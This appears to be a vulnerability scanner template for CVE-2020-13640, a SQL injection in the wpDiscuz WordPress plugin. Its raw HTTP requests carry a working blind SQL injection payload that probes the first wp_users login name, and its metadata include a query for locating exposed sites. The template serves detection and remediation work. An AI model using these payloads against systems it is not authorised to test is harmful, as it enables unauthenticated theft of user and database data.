flow: 'http(1)

  set("postid", iterate(template.postid)[0])

  http(2) && http(3)

  '
http:
- extractors:
  - group: 1
    internal: true
    name: postid
    part: body
    regex:
    - post"\s*:\s*([0-9]+)
    type: regex
  raw:
  - 'GET /wp-json/wp/v2/comments HTTP/1.1

    Host: {{Host}}

    '
  stop-at-first-match: true
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - comment_list":"<div id=\"wc-comm
  raw:
  - 'POST /wp-content/plugins/wpdiscuz/utils/ajax/wpdiscuz-ajax.php HTTP/1.1

    Host: {{Host}}

    Content-Type: application/x-www-form-urlencoded

    Connection: close


    action=wpdLoadMoreComments&offset=1&orderBy=comment_date_gmt&order=, (SELECT CASE
    WHEN (ORD(SUBSTRING((SELECT user_login FROM wp_users LIMIT 0,1),1,1)) > 96) THEN
    1 ELSE 1*(SELECT table_name FROM information_schema.tables) END)=1 ASC #&lastParentId=&postId={{postid}}

    '
  stop-at-first-match: true
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"comment_list":null'
  raw:
  - 'POST /wp-content/plugins/wpdiscuz/utils/ajax/wpdiscuz-ajax.php HTTP/1.1

    Host: {{Host}}

    Content-Type: application/x-www-form-urlencoded

    Connection: close


    action=wpdLoadMoreComments&offset=1&orderBy=comment_date_gmt&order=, (SELECT CASE
    WHEN (ORD(SUBSTRING((SELECT user_login FROM wp_users LIMIT 0,1),1,1)) > 97) THEN
    1 ELSE 1*(SELECT table_name FROM information_schema.tables) END)=1 ASC #&lastParentId=&postId={{postid}}

    '
  stop-at-first-match: true
id: CVE-2020-13640
info:
  author: Sourabh-Sahu
  classification:
    cpe: cpe:2.3:a:gvectors:wpdiscuz:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2020-13640
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98616
    epss-score: 0.70234
  description: 'A SQL injection issue in the gVectors wpDiscuz plugin 5.3.5 and earlier
    for WordPress allows remote attackers to execute arbitrary SQL commands via the
    order parameter of a wpdLoadMoreComments request.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL commands to extract
    database contents including user credentials, posts, and sensitive WordPress configuration
    data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wpdiscuz"
    max-request: 2
    product: wpdiscuz
    vendor: gvectors
    verified: true
  name: wpDiscuz <= 5.3.5 - SQL Injection
  reference:
  - https://github.com/asterite3/CVE-2020-13640
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13640
  remediation: 'Upgrade to wpDiscuz version 5.3.6 or later.

    '
  severity: critical
  tags: cve,cve2020,wordpress,wp,wp-plugin,wpdiscuz,sqli,vkev,vuln
